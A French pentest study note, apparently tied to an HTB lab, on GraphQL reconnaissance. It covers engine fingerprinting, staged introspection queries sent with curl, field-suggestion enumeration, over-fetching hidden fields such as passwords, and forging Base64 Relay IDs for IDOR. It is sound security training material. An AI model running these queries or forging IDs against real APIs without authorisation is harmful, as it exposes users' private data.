---
titre: "GraphQL — Repérage (introspection)"
tags: [Failles, GraphQL]
---

# GraphQL — Repérage (introspection)

> ⬅ [[GraphQL - Index]]

Lié : GraphQL · GraphQL · GraphQL

---

## Le concept

L'introspection est une **fonctionnalité native de GraphQL** : le client peut interroger l'API **sur sa propre structure**. Le schéma se décrit lui-même via des champs spéciaux préfixés `__` (double underscore) : `__schema`, `__type`, `__typename`.

C'est l'équivalent du **WSDL en SOAP**, mais en mieux : tu n'as pas à le trouver, tu le **demandes** directement à l'endpoint.

**Pourquoi c'est critique offensivement** : l'introspection te révèle **tous les types, champs, queries, mutations et arguments** du backend — y compris ceux que le front-end n'utilise jamais. Combiné au fait que le client choisit ses champs → tu demandes `password`, `secret`, `flag`… et le serveur te les sert.

---

## Identifier le moteur GraphQL (graphw00f)

Avant d'introspectionner, identifie le moteur (Apollo, Graphene, Hasura…) pour connaître ses **défauts par défaut** :

```bash
python3 /opt/graphw00f/main.py -d -f -t http://<TARGET>
```

- `-d` = detect (localiser l'endpoint)
- `-f` = fingerprint (identifier le moteur)
- Fournit un lien vers la **GraphQL Threat Matrix** (introspection activée ? suggestions ? depth limit ?)

Le fingerprinting fonctionne via des requêtes **volontairement malformées** : chaque moteur "signe" ses erreurs différemment (même logique que `nmap -sV`).

---

## Requêtes d'introspection (progressives)

### Niveau 1 — Lister tous les types
```graphql
{ __schema { types { name } } }
```
→ Trier : ignorer `String`, `Int`, `Boolean`, `__*`. Repérer les **types métier** et **l'intrus** (un `SecretObject`, `ApiKeyObject`…).




### Niveau 1(fort) — Lister tous les types
```graphql
curl -s -X POST http://TARGET:PORT/graphql -H "Content-Type: application/json" -d '{"query":"query IntrospectionQuery { __schema { queryType { name kind } mutationType { name kind } subscriptionType { name kind } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}' | jq
```
→ Introspection complète




### Niveau 2 — Lister les queries + arguments
```graphql
{ __schema { queryType { fields { name description args { name type { name kind } } } } } }
```
→ Les portes de lecture. Les `args` = points d'injection et leviers IDOR.

### Niveau 3 — Lister les mutations + inputs
```graphql
{ __schema { mutationType { fields { name args { name type { name kind ofType { name } } } } } } }
```
→ Les portes d'écriture. Repérer `register`, `create`, `update` + champs `role`/`isAdmin`.

### Niveau 4 — Détailler un type (ses champs)
```graphql
{ __type(name: "UserObject") { name fields { name type { name kind } args { name type { name kind } } } } }
```
Pour un **input type** (attention : `inputFields` et non `fields`) :
```graphql
{ __type(name: "RegisterUserInput") { inputFields { name type { name kind } } } }
```

### Niveau 5 — Dump total
La grosse `query IntrospectionQuery` avec fragments (voir GraphQL). Coller le JSON dans **GraphQL Voyager** pour visualiser.

---

## Visualisation du schéma

**GraphQL Voyager** : https://graphql-kit.com/graphql-voyager/ (ou https://apis.guru/graphql-voyager/)
- Clic *Change Schema* → *Introspection* → coller le JSON → *Display*
- Résultat : diagramme type "base de données" avec toutes les relations

⚠️ **OPSEC** : en engagement réel, héberger Voyager soi-même (Docker) pour ne pas envoyer le schéma du client à un tiers.

---

## Field Suggestions (plan B si introspection désactivée)

Si l'introspection est coupée, certains moteurs (dont Graphene par défaut) **suggèrent** le bon nom quand tu te trompes :

```graphql
{ user { usrname } }
```
→ Erreur : `Did you mean "username"?`

Tu devines les champs en envoyant des approximations et en lisant les corrections. Plus lent mais fonctionnel.

**Outil** : [clairvoyance](https://github.com/nikitastupin/clairvoyance) — automatise la reconstruction du schéma via les suggestions.

---

## Over-fetching (exploitation directe de l'introspection)

L'introspection te dit qu'un champ `password` existe → tu le **demandes** :

```graphql
{ users { username password } }
```

Le front ne l'affiche jamais, mais le resolver le sert. C'est le cas le plus basique de fuite GraphQL.

### Cas du lab (section 2) — flag dans SecretObject

```
1. __schema { types { name } }              → repéré SecretObject
2. __type(name:"SecretObject"){fields{name}} → champs : id, secret
3. { secrets { id secret } }                 → HTB{...}
```

Cheminement en 3 temps : **découvrir le type** → **voir ses champs** → **les demander**.

---

## Global IDs (Relay) — décodage et forge

Les IDs Relay sont du `TypeObject:n` encodé en Base64 :
```bash
echo "U2VjcmV0T2JqZWN0OjE=" | base64 -d    # → SecretObject:1
echo -n "SecretObject:2" | base64             # → U2VjcmV0T2JqZWN0OjI=
```
→ Vecteur d'**IDOR** : forger l'ID d'un objet qui n'est pas à toi.

---

## GraphiQL — l'IDE offert par la cible

Si `/graphql` est accessible dans un navigateur et que GraphiQL est activé :
- Panneau gauche = ta query, panneau droit = la réponse
- **`Ctrl+Espace`** = auto-complétion des champs/queries
- **Onglet "Docs"** (coin supérieur droit) = le schéma navigable à la souris (introspection en version clic)
- Le cookie de session est joint automatiquement (`credentials: 'include'`)

En curl, la structure d'appel :
```bash
curl -s -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | jq
```
→ La query GraphQL multi-lignes doit être **aplatie sur une ligne** dans le JSON.
